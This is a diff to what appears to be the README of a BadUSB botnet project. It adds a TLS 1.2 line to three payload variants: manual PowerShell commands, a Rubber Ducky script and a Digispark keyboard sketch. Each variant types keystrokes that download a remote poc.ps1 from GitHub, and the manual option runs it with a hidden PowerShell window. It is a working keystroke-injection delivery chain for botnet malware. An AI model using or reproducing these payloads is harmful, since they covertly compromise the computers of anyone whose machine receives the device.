@@ -19,6 +19,7 @@ $githubScript = '<you_fork/poc.ps1>'
 ## Option 1
 
 ```powershell
+> [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 > (new-object net.webclient).DownloadFile('https://github.com/alexfrancow/badusb_botnet/blob/master/poc.ps1','poc.ps1')
 > powershell.exe -windowstyle hidden -file poc.ps1
 ```
@@ -31,6 +32,9 @@ STRING powershell
 DELAY 500
 ENTER
 DELAY 750
+STRING [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+DELAY 500
+ENTER
 STRING (new-object net.webclient).DownloadFile('https://github.com/alexfrancow/badusb_botnet/blob/master/poc.ps1','poc.ps1')
 DELAY 500
 ENTER
@@ -54,6 +58,9 @@ DigiKeyboard.delay(500);
 DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
 DigiKeyboard.delay(500);
 DigiKeyboard.print("powershell");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(500);
+DigiKeyboard.print("[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(500);
 DigiKeyboard.print("(new-object net.webclient).DownloadFile('https://github.com/alexfrancow/badusb_botnet/blob/master/poc.ps1','poc.ps1')");
